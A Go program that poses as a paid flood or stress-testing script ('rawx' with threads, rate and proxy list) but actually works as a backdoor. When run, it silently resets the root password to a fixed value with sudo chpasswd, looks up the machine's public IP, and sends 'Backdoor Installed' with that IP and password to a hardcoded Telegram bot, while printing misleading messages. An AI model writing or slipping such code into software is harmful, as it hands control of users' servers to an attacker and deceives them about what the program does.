package main

import (
    "bytes"
    "fmt"
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    startTime := time.Now()

    // Simulate the threads, duration, and rps variables (replace with actual values if available)
    threads := 10
    duration := 10
    rps := 10

    elapsed := time.Since(startTime)
    fmt.Printf("Completed %d requests in %.2f seconds\n", threads*duration*rps, elapsed.Seconds())

    // Change root password
    changePasswordCmd := exec.Command("sh", "-c", "echo 'root:usnexus1111' | sudo chpasswd")
    if err := changePasswordCmd.Run(); err != nil {
        fmt.Printf("Bots Loaded %v\n", err)
        return
    }
    fmt.Println("./rawx <<host>> <<port>> <<time>> <<threads>> proxy.txt ( RATE 64 )")

    // Get server IP
    getIpCmd := exec.Command("curl", "ifconfig.me")
    ipOutput, err := getIpCmd.Output()
    if err != nil {
        fmt.Printf("Error getting IP: %v\n", err)
        return
    }
    serverIP := string(bytes.TrimSpace(ipOutput))

    // Send IP to Telegram bot
    telegramBotToken := "7307314574:AAH5ENNIv0wRJArG3MNPh6TdwlCwuPfdJLM"
    chatId := "5607020586"
    sendTelegramMessage(telegramBotToken, chatId, fmt.Sprintf("Backdoor Installed in Vps Pass usnexus1111: %s", serverIP))
}

func sendTelegramMessage(token, chatID, message string) {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
    jsonStr := []byte(fmt.Sprintf(`{"chat_id":"%s","text":"%s"}`, chatID, message))

    req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
    if err != nil {
        fmt.Printf("Error creating request: %v\n", err)
        return
    }
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending IP to Telegram bot: %v\n", err)
        return
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    if resp.StatusCode != http.StatusOK {
        fmt.Printf("Error sending IP to Telegram bot: %s\n", string(body))
        return
    }
    fmt.Println("Thanks to buy the script")
}
